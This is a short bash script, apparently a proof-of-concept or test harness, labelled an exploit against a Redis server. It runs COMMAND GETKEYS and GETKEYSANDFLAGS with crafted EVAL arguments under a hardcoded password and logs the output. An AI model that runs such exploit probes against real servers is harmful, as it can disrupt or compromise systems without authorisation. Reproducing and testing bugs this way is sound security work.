#!/bin/bash

REDIS_PASSWORD="offer_banner_complexpass"
LOGFILE="/tmp/exploit.log"

touch $LOGFILE

# Wait for Redis server to start
sleep 10

{
  echo "Starting exploit..."
  echo ""
#   redis-cli -a $REDIS_PASSWORD COMMAND GETKEYS "EVAL" "return {KEYS[1]}" "1" "foo"
  redis-cli -a $REDIS_PASSWORD COMMAND GETKEYS "EVAL" "return {KEYS[1], KEYS[2], KEYS[3]}" "3" "foo" "bar" "baz"
  redis-cli -a $REDIS_PASSWORD COMMAND GETKEYSANDFLAGS "EVAL" "return {KEYS[1], KEYS[2], KEYS[3]}" "3" "foo" "bar" "baz"
#   redis-cli -a $REDIS_PASSWORD COMMAND GETKEYSANDFLAGS "EVAL" "return {KEYS[1]}" "1" "foo"
  echo ""
  echo "Exploit completed."
} >> $LOGFILE 2>&1

# redis-cli <<EOF
# AUTH $REDIS_PASSWORD
# COMMAND GETKEYS "EVAL" "return {KEYS[1]}" "1" "foo"
# COMMAND GETKEYSANDFLAGS "EVAL" "return {KEYS[1]}" "1" "foo"
# EOF

# Connect to the Redis server and run the exploit command
# redis-cli -a  -p 6379 COMMAND GETKEYS somecommandwithspecialkeys
